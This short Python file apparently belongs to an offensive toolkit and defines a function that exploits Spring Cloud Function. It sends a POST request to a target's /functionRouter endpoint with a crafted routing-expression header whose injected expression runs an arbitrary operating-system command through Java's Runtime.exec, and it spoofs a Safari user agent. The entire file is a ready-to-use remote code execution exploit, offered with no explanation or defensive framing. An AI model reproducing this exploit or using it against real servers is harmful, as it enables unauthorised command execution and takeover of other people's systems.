#! python !#
from misc.session import *
import urllib.parse

def spring4(ip, cmd, session):
    try:
        #encode command as url
        #command = urllib.parse.quote_plus(cmd)
        #command.replace(' ', '${IFS}')
        
        headers = {
            'Connection': 'close',
            'spring.cloud.function.routing-expression': f'T(java.lang.Runtime).getRuntime().exec("{cmd}")',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15',
        }

        data = '51pwn'
        response = session.post(f'http://{ip}/functionRouter', headers=headers, data=data)
        return True
    except Exception as e: return (False, e)